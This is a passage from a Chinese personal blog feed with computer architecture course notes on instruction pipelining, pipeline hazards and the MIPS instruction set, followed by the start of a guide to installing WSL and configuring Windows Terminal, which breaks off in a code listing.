alt="image-20210504195556778" /></p><p>电路图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504195639490.png" alt="image-20210504195639490" /></p><p>上图分析：</p><ol><li><p>IF：Instruction fetch cycle</p><blockquote><ol><li>按照PC内容访问指令存储器，取出指令</li><li>PC+4→NPC，以获取下一条指令地址</li></ol></blockquote></li><li><p>ID：Instruction decode/register fetch cycle</p><blockquote><ol><li>指令译码</li><li>读寄存器</li><li>如果需要，则符号扩展指令中的位移量</li></ol></blockquote></li><li><p>EX：Execution（执行）/effective address cycle</p><blockquote><ul><li>Load/Store：计算数据存储器有效地址</li><li>R-R/R-I ALU：执行运算操作</li><li>Branch：做“=0？”测试，并置条件，计算目标地址</li></ul></blockquote></li><li><p>MEM：Memory access</p><blockquote><ul><li>Load：送有效地址到数据存储器，取数据</li><li>Store：写ID，读出数据到有效地址单元中</li><li>Branch：如果条件满足计算目标地址送PC；否则NPC送PC</li></ul></blockquote></li><li><p>WB：Write-back cycle</p><blockquote><ul><li>Load or ALU：写结果到寄存器堆</li></ul></blockquote></li></ol><h4 id="32-多周期实现的改进"><a class="markdownIt-Anchor" href="#32-多周期实现的改进"></a> 3.2 多周期实现的改进</h4><ol><li>对于Branch，将“=0？”测试和计算可能的转移目标地址提前到ID</li><li>完成ALU指令在MEM cycle</li></ol><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504201717892.png" alt="image-20210504201717892" /></p><ol start="3"><li><p>改进硬件冗余</p><blockquote><ol><li>ALU可以共享</li><li>数据和指令存储器可以合并</li></ol></blockquote></li></ol><h3 id="4-经典5段流水线risc处理器"><a class="markdownIt-Anchor" href="#4-经典5段流水线risc处理器"></a> 4. 经典5段流水线RISC处理器</h3><h4 id="41-特点"><a class="markdownIt-Anchor" href="#41-特点"></a> 4.1 特点</h4><ol><li>5个段构成一个指令流水线，一条指令经过每个段</li><li>CPI减小到1，因为平均每个时钟周期发射或完成一条指令</li><li>在任意时钟周期，在每个流水段正执行一条指令的部分</li><li>理想情况下，性能提升5倍</li></ol><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504202456375.png" alt="image-20210504202456375" /></p><h4 id="42-实现"><a class="markdownIt-Anchor" href="#42-实现"></a> 4.2 实现</h4><p>为了实现，在每两段之间新增流水线寄存器，其作用：</p><ol><li>在本周期提供流水段中指令操作的数据及控制信息</li><li>周期结束时，存指令操作结果供下一个流水段指令使用</li></ol><p>如下图蓝色部分：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203103762.png" alt="image-20210504203103762" /></p><h4 id="43-对比"><a class="markdownIt-Anchor" href="#43-对比"></a> 4.3 对比</h4><ol><li><p>对比单周期实现，流水线减少了时钟周期长度</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203333003.png" alt="image-20210504203333003" /></p></li><li><p>对比多周期实现，流水线减少了CPI</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203357254.png" alt="image-20210504203357254" /></p></li></ol><h4 id="44-问题"><a class="markdownIt-Anchor" href="#44-问题"></a> 4.4 问题</h4><h5 id="441-存储器访问冲突"><a class="markdownIt-Anchor" href="#441-存储器访问冲突"></a> 4.4.1 存储器访问冲突</h5><p>结构冒险（structure hazard）：在同一时钟周期不同操作使用同一数据通路资源</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203832540.png" alt="image-20210504203832540" /></p><p>解决：使用分开的指令cache和数据cache</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504204140731.png" alt="image-20210504204140731" /></p><p>注意：如果时钟周期不变，流水线存储系统的带宽<strong>必须是非流水线的5倍</strong></p><h5 id="442-寄存器冲突"><a class="markdownIt-Anchor" href="#442-寄存器冲突"></a> 4.4.2 寄存器冲突</h5><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504204333445.png" alt="image-20210504204333445" /></p><p>解决：重新设计寄存器堆资源</p><ol><li><p>允许在一个时钟周期WB段先写，ID段后读</p><blockquote><p>每个时钟周期完成2个读和一个写</p><p>需要提供两个读端口和一个写端口</p><p>当写和读同一个寄存器会发生数据冒险（Data hazard）</p></blockquote></li></ol><h5 id="443-更新pc时冲突"><a class="markdownIt-Anchor" href="#443-更新pc时冲突"></a> 4.4.3 更新PC时冲突</h5><p>每个时钟周期必须增量PC并存储到PC</p><p>遇到转移指令时可能会改变PC的值，可能会产生控制冒险（Control hazard）</p><h3 id="5-流水线的基本性能"><a class="markdownIt-Anchor" href="#5-流水线的基本性能"></a> 5. 流水线的基本性能</h3><ol><li>增大了吞吐量（单位时间完成指令条数）</li><li>每一条指令的执行时间没有加快</li><li>延迟：附加的控制增加了开销</li><li>不平衡：流水线各段时间以最慢的为准</li><li>附加开销：流水线寄存器</li><li>流水线冒险：串行机器不会产生冒险</li><li>填充和排空：会减小加速比</li></ol><h2 id="流水线的主要障碍-流水线冒险相关"><a class="markdownIt-Anchor" href="#流水线的主要障碍-流水线冒险相关"></a> 流水线的主要障碍-流水线冒险（相关）</h2><h3 id="1-冒险分类与有停顿流水线性能"><a class="markdownIt-Anchor" href="#1-冒险分类与有停顿流水线性能"></a> 1. 冒险分类与有停顿流水线性能</h3><h4 id="11-冒险分类"><a class="markdownIt-Anchor" href="#11-冒险分类"></a> 1.1 冒险分类：</h4><ol><li>结构冒险：指令重叠执行时，发生硬件资源冲突</li><li>数据冒险：几条指令重叠执行时，后面指令依赖前面指令的结果却没有准备好（没有计算或存储）</li><li>控制冒险：发生在流水线执行转移指令时，在进入ID段时，转移条件和转移目标地址不能按时提供给IF段取下一条指令</li></ol><p>冒险出现时：避免流水线上有冒险的指令执行下一个流水段</p><p>冒险总是可以用停顿（流水线气泡/气泡）解决：停顿时，其后的所有指令被停顿，指令之前的指令继续执行，没有新的指令被取到流水线</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504211313154.png" alt="image-20210504211313154" /></p><h4 id="12-有停顿的流水线性能"><a class="markdownIt-Anchor" href="#12-有停顿的流水线性能"></a> 1.2 有停顿的流水线性能</h4><p>加速比公式：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504211507892.png" alt="image-20210504211507892" /></p><p>流水线CPI=理想CPI（≈1）+平均每条指令的停顿周期数</p><p>忽略流水线时钟周期的额外开销，并假设流水段是平衡的，则：非流水线时钟周期=流水线时钟周期</p><p>最终得：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504212021602.png" alt="image-20210504212021602" /></p><h3 id="2-结构冒险流水段竞争"><a class="markdownIt-Anchor" href="#2-结构冒险流水段竞争"></a> 2. 结构冒险：流水段竞争</h3><h4 id="21-定义"><a class="markdownIt-Anchor" href="#21-定义"></a> 2.1 定义</h4><p>发生在同一时钟周期，2条或多条指令想要使用同一硬件资源</p><h4 id="22-出现情况"><a class="markdownIt-Anchor" href="#22-出现情况"></a> 2.2 出现情况</h4><ol><li>多重访问寄存器堆</li><li>多重访问存储器</li><li>没有或没有充分流水功能部件</li></ol><h4 id="23-解决"><a class="markdownIt-Anchor" href="#23-解决"></a> 2.3 解决</h4><ol><li><p>寄存器堆的多重访问</p><blockquote><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213234617.png" alt="image-20210504213234617" /></p><p>方法1.：简单插入一个停顿，将降低加速比</p><p>方法2：在一个时钟周期WB段先写，ID段后读</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213429124.png" alt="image-20210504213429124" /></p></blockquote></li><li><p>多重访问单端口存储器</p><blockquote><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213646077.png" alt="image-20210504213646077" /></p><p>方法1：插入停顿</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213806538.png" alt="image-20210504213806538" /></p><p>方法2：提供另一个存储器端口</p><p>方法3：分开指令存储器和数据存储器</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213843051.png" alt="image-20210504213843051" /></p><p>方法4：使用指令缓冲器</p></blockquote></li><li><p>没有完全流水化的功能部件</p><blockquote><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504214056065.png" alt="image-20210504214056065" /></p></blockquote></li></ol><h4 id="24-认识"><a class="markdownIt-Anchor" href="#24-认识"></a> 2.4 认识</h4><p>结构冒险是被允许的，为了<strong>减少成本、减少部件延迟</strong></p><h3 id="3-数据冒险"><a class="markdownIt-Anchor" href="#3-数据冒险"></a> 3. 数据冒险</h3><h4 id="31-定义"><a class="markdownIt-Anchor" href="#31-定义"></a> 3.1 定义</h4><p>由于流水线上指令重叠执行，改变了原来串行执行的读/写操作数顺序，使得后面依赖前面指令结果的指令得不到准备好的数据</p><h4 id="32-解决"><a class="markdownIt-Anchor" href="#32-解决"></a> 3.2 解决</h4><p>不要让指令在数据冒险时重叠执行</p><h4 id="33-实施"><a class="markdownIt-Anchor" href="#33-实施"></a> 3.3 实施</h4><p>流水线停顿</p><p>软件：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505153243028.png" alt="image-20210505153243028" /></p><p>硬件：</p><blockquote><p>增加硬件互锁（Interlock）</p><blockquote><p>增加额外硬件检测需要停顿的情况</p><p>增加额外硬件放“气泡”（暂停）到流水线</p></blockquote><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505153751740.png" alt="image-20210505153751740" /></p></blockquote><h4 id="34-forwarding前推-直通-转发-相关数据通路"><a class="markdownIt-Anchor" href="#34-forwarding前推-直通-转发-相关数据通路"></a> 3.4 Forwarding（前推、直通、转发、相关数据通路）</h4><p>有数据冒险指令需要的结果可能已经计算出来，存放在流水线寄存器中，所以我们可以在数据通路中增加数据线（buses）传送这些结果，这些buses总是从后面的流水段连接到前面的流水段</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505154733078.png" alt="image-20210505154733078" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155325030.png" alt="image-20210505155325030" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155531924.png" alt="image-20210505155531924" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155617247.png" alt="image-20210505155617247" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155645091.png" alt="image-20210505155645091" /></p><p>没有Forwarding和有Forwarding的比较：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155812070.png" alt="image-20210505155812070" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155823248.png" alt="image-20210505155823248" /></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;流水线的基本概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#流水线的基本概念&quot;&gt;&lt;/a&gt; 流水线的基本概念&lt;/h2&gt;
&lt;h3 id=&quot;1-什么是流水线&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是流水线&quot;&gt;&lt;/a&gt; 1. 什么是流水线&lt;/h3&gt;
&lt;p&gt;定义：流水线是利用执行指令操作之间的并行性，实现多条指令重叠执行的技术&lt;/p&gt;
&lt;h4 id=&quot;11-术语&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#11-术语&quot;&gt;&lt;/a&gt; 1.1 术语&lt;/h4&gt;
&lt;p&gt;流水段（流水级）：完成一条指令的一部分操作&lt;/p&gt;
&lt;p&gt;机器周期（流水线周期）：指令沿流水线移动一个流水段的时间。长度取决于最慢的流水段，一般是一个时钟周期（有时是两个时钟周期）。每个流水线周期从指令流水线流出一条指令&lt;/p&gt;
&lt;p&gt;吞吐量：单位时间从流水线流出的指令数&lt;/p&gt;</summary>
    
    
    
    <category term="系统结构" scheme="https://wsw8.online/categories/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="系统结构" scheme="https://wsw8.online/tags/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>系统结构第二章_指令系统原理与实例</title>
    <link href="https://wsw8.online/archives/a6c351d5.html"/>
    <id>https://wsw8.online/archives/a6c351d5.html</id>
    <published>2021-05-02T06:52:30.000Z</published>
    <updated>2021-05-10T08:30:51.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-指令集系统结构的分类"><a class="markdownIt-Anchor" href="#1-指令集系统结构的分类"></a> 1. 指令集系统结构的分类</h2><p>根本区别：处理器内部数据的存储结构不同</p><p>存储结构：</p><ol><li>堆栈：操作数隐含的位于栈顶</li><li>累加器：一个隐含操作数就是累加器</li><li>通用寄存器：明确地指定操作数，不是寄存器就是存储器地址<ol><li>register-memory系统结构：一般指令都可以访存</li><li>register-register/load-store系统结构：只有load、store指令能访存</li></ol></li></ol><span id="more"></span><p>图示：</p><p>数据流动示意图：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502145943075.png" alt="image-20210502145943075" /></p><p>运算例子示意图：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502150225975.png" alt="image-20210502150225975" /></p><p>通用寄存器ISA运算类指令的两个特性：</p><ol><li>ALU指令中包括两个或三个操作数</li><li>ALU指令中包括0到3个存储器操作数</li></ol><p>通用寄存器计算机优缺点：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502151144878.png" alt="image-20210502151144878" /></p><h2 id="2-存储器寻址"><a class="markdownIt-Anchor" href="#2-存储器寻址"></a> 2. 存储器寻址</h2><h3 id="21-寻址方式"><a class="markdownIt-Anchor" href="#21-寻址方式"></a> 2.1 寻址方式</h3><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502152010830.png" alt="image-20210502152010830" /></p><h3 id="22-小结"><a class="markdownIt-Anchor" href="#22-小结"></a> 2.2 小结</h3><ol><li>一般ISA支持的基本寻址方式：立即数寻址、位移量寻址、寄存器间接寻址</li><li>位移量为13-16位、立即数为16位</li><li>立即数寻址通常用于：运算类指令、置常数到寄存器指令</li></ol><h2 id="3-mips系统结构"><a class="markdownIt-Anchor" href="#3-mips系统结构"></a> 3. MIPS系统结构</h2><p>特点：</p><ol><li>一种简单64位load-store系统结构</li><li>固定长度指令编码</li></ol><p>寄存器：</p><ol><li>32个64位通用寄存器（GPR），R0……R31，<strong>R0永远是0</strong></li><li>32个浮点寄存器（FPR），F0……F31，可作为32位单精度寄存器使用，也可作为64位双精度寄存器使用</li></ol><p>寻址方式：</p><ol><li>16位立即数寻址</li><li>16位基址寻址，当位移量为0时是寄存器间接寻址、当R0作为基址寄存器时是16位绝对寻址</li></ol><p>指令格式：</p><ol><li>指令长度：32位，6位为基本操作码</li><li>两种存储器寻址方式：编码到操作码中</li></ol><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503153254772.png" alt="image-20210503153254772" /></p><p>操作：</p><ol><li>载入和存储<ul><li>所有通用寄存器和浮点数寄存器都可以被载入或存储，除了R0</li><li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503153545936.png" alt="image-20210503153545936" /></li><li>上述图示说明：<ol><li>⬅的下标表示传送n位</li><li>Mem表示主存，按字节编址</li><li>下标标识字段中特定的位，从以0开始的最高位开始标注</li><li>上标表示对字段的复制</li><li>##表示字段的连接</li></ol></li></ul></li><li>ALU操作<ul><li>都是寄存器-寄存器指令</li><li>包括算术和逻辑操作：加、减、与、或、异或、移位</li><li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503154351355.png" alt="image-20210503154351355" /></li></ul></li><li>分支和跳转<ul><li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503154602183.png" alt="image-20210503154602183" /></li></ul></li><li>浮点操作<ul><li>浮点指令指出操作数是单精度（SP）还是双精度（DP）</li><li>MOV.S和MOV.D分别复制单精度和双精度的寄存器</li><li>MFC1、MTC1、DMFC1、DMTC1在一个单精度或双精度浮点数寄存器和一个定点寄存器之间传送数据</li></ul></li></ol><h2 id="4-一些误区"><a class="markdownIt-Anchor" href="#4-一些误区"></a> 4. 一些误区</h2><ol><li>专门设计支持高级语言结构的“高级”指令功能</li><li>存在一种典型的程序</li><li>可以不考虑编译器而改进指令系统以缩减代码大小</li><li>有缺陷的系统结构不可能是一种成功的系统结构</li><li>可以设计一个没有缺陷的系统结构</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-指令集系统结构的分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-指令集系统结构的分类&quot;&gt;&lt;/a&gt; 1. 指令集系统结构的分类&lt;/h2&gt;
&lt;p&gt;根本区别：处理器内部数据的存储结构不同&lt;/p&gt;
&lt;p&gt;存储结构：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;堆栈：操作数隐含的位于栈顶&lt;/li&gt;
&lt;li&gt;累加器：一个隐含操作数就是累加器&lt;/li&gt;
&lt;li&gt;通用寄存器：明确地指定操作数，不是寄存器就是存储器地址
&lt;ol&gt;
&lt;li&gt;register-memory系统结构：一般指令都可以访存&lt;/li&gt;
&lt;li&gt;register-register/load-store系统结构：只有load、store指令能访存&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="系统结构" scheme="https://wsw8.online/categories/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="系统结构" scheme="https://wsw8.online/tags/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>wsl的安装与配置</title>
    <link href="https://wsw8.online/archives/cee22f12.html"/>
    <id>https://wsw8.online/archives/cee22f12.html</id>
    <published>2021-05-02T03:34:04.000Z</published>
    <updated>2021-05-10T08:12:27.057Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>之前上过一个Linux的选修课，了解了Linux系统的一些知识，越用越觉得一些需要命令行的软件用Linux来简直太方便了，这篇文章就介绍以下如何在windows系统上搭建Linux子系统（也就是wsl）（Windows Subsystem for Linux），这样就不用使用VMware来装虚拟机了</p><span id="more"></span><h2 id="windows-10-开启wsl功能"><a class="markdownIt-Anchor" href="#windows-10-开启wsl功能"></a> windows 10 开启wsl功能</h2><ol><li>按Windows+Q进入搜索功能，也可以右键点击开始，选择里面的搜索功能</li><li>在Windows 10的搜索框中输入<code>启用或关闭Windows功能</code></li><li>打开后选中<code>适用于Linux的Windows子系统</code><br /><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503170452634.png" alt="image-20210503170452634" /></li></ol><h2 id="linux的安装"><a class="markdownIt-Anchor" href="#linux的安装"></a> Linux的安装</h2><ol><li>打开微软商店（Microsoft Store）</li><li>搜索Linux</li><li>选择其中的一个发行版本进行安装，本文以debian为例</li></ol><p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171000458.png" alt="image-20210503171000458" /></p><p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171035452.png" alt="image-20210503171035452" /></p><h2 id="linux初始化"><a class="markdownIt-Anchor" href="#linux初始化"></a> Linux初始化</h2><ol><li><p>打开刚下好的Linux，等一小会它的安装</p></li><li><p>输入新创建的用户名</p></li><li><p>输入该用户的密码，输入两次后就进入了Linux系统，新用户也创建完成</p></li><li><p>输入<code>sudo passwd</code>更改root的密码</p></li><li><p>一些知识</p><blockquote><p>输入<code>su</code>再输入密码进入root模式<br />输入<code>exit</code>或者按<code>ctrl+d</code>退出root模式<br />输入<code>sudo 命令</code>可以在普通用户下执行root权限的命令，密码是普通用户的密码</p></blockquote></li></ol><h2 id="terminal安装"><a class="markdownIt-Anchor" href="#terminal安装"></a> Terminal安装</h2><p>Terminal是一款高颜值的管理命令行软件，如果你习惯于PowerShell或者cmd的话可以跳过此步骤</p><ol><li>打开微软商店（MicroSoft Store）</li><li>搜索Terminal</li><li>点击安装</li></ol><h2 id="terminal配置"><a class="markdownIt-Anchor" href="#terminal配置"></a> Terminal配置</h2><p>简单配置一下Terminal，让你用起来更舒服，可跳过</p><ol><li>打开Terminal</li><li>打开设置</li></ol><p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171852186.png" alt="image-20210503171852186" /></p><ol start="3"><li>点击左下角的设置图标，进入Terminal的配置文件，如下，<strong>为了安全起见建议备份一下，不然出问题不好还原</strong></li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span 